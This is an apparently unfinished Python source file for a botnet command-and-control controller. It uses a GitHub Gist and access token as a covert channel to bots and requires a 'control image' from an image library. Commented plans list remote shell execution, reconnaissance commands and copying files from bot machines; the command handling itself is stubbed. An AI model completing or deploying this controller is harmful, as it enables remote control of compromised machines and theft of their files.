import argparse
import os
import select
import shutil
import sys

from git import GithubGistClient

# from time import sleep
# import subprocess

IMAGES_LIBRARY = '4c7fe7e6d06b0b90ab4848b234209e95'
CONTROL_IMAGE = 'security.jpg'
UPDATE_INTERVAL = 30  # seconds


class Controller:

    def __init__(
        self,
        workdir: str,
        gist: str,
        token: str,
        recreate_workdir: bool = False,
        skip_init_reset: bool = False,
        skip_init_pull: bool = False,
    ) -> None:
        self._workdir = os.path.abspath(workdir)
        self._gist = gist
        self._token = token
        self._recreate_workdir = recreate_workdir
        self._skip_init_reset = skip_init_reset
        self._skip_init_pull = skip_init_pull

        self._lib_dir = os.path.join(self._workdir, 'lib')
        self._lib_client = GithubGistClient(
            gist=IMAGES_LIBRARY,
            repo_dir=self._lib_dir,
        )

        self._comm_dir = os.path.join(self._workdir, 'comm')
        self._comm_client = GithubGistClient(
            gist=self._gist,
            token=self._token,
            repo_dir=self._comm_dir,
        )

    def _create_commands_parser(self) -> None:
        self._parser = argparse.ArgumentParser()
        self._parser.add_argument(
            'workdir',
            help='work directory where the files and directories created by the controller will be put'
        )
        self._parser.add_argument('gist', help='ID of the GitHub Gist for communication with bots')
        self._parser.add_argument('token', help='GitHub Personal access token (classic) with (at least) gist scope')
        return

    def _ensure_workdir(self) -> None:
        if os.path.isdir(self._workdir) and self._recreate_workdir:
            print(f'removing and re-creating workdir {self._workdir}...')
            shutil.rmtree(self._workdir)
        if not os.path.isdir(self._workdir):
            os.makedirs(self._workdir)
        print(f'workdir ready')

    def _load_lib_images(self):
        self._lib_images = set(filter(
            lambda f: f.endswith('.png') or f.endswith('.jpg'),
            os.listdir(self._lib_dir),
        ))
        print(f'library contains {len(self._lib_images)} images:')
        for img in self._lib_images:
            print(f'  {img}')
        if CONTROL_IMAGE not in self._lib_images:
            raise RuntimeError(f'Control image {CONTROL_IMAGE} is not the library!')

    def _setup(self) -> None:
        self._ensure_workdir()

        print('initializing images library to...')
        self._lib_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )
        self._load_lib_images()

        print(f'initializing the gist from {self._comm_client.get_https_url(with_token=False)} to {self._comm_dir} ...')
        self._comm_client.init(
            skip_reset=self._skip_init_reset,
            skip_pull=self._skip_init_pull,
        )

        self._bots = {}

        self._create_commands_parser()

        pass

    def update_state(self) -> None:
        print('updating bots state ...')
        self._comm_client.pull_changes()
        # TODO
        pass

    def process_command(self, cmd_str) -> None:
        print(f"processing command '{cmd_str}'")
        args = self._parser.parse_args(args=cmd_str.split(sep=' '))
        print(args)
        # help
        # terminate <bot>
        # do <bot> id
        # do <bot> who
        # do <bot> ls <>
        # run [--shell] [--no-output] <bot>
        # copyFrom <bot> <file name>

        pass

    def run(self) -> None:
        self._setup()

        while True:
            print('Enter a command. Type help for help.\n> ', end='')
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                cmd_str = sys.stdin.readline().strip()
                self.process_command(cmd_str)
            else:
                # so we do not write to the prompt line
                # note: we could also use ASCII ESC sequences to clear the prompt (and add colors as well)
                print('')
            self.update_state()

        pass

    def stop(self) -> None:
        print('Stopping the controller. Note that the bots might still be running.')
        print('Use terminate command to stop a specific bot.')

    pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='Remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='Skip resetting the git repos if they already exist.',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='Skip updating the git repos if they already exist.',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='Shortcut for combination of of --skip-init-reset and --skip-init-pull.',
    )
    _args = _parser.parse_args()
    _controller = Controller(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _controller.run()
    except KeyboardInterrupt:
        _controller.stop()
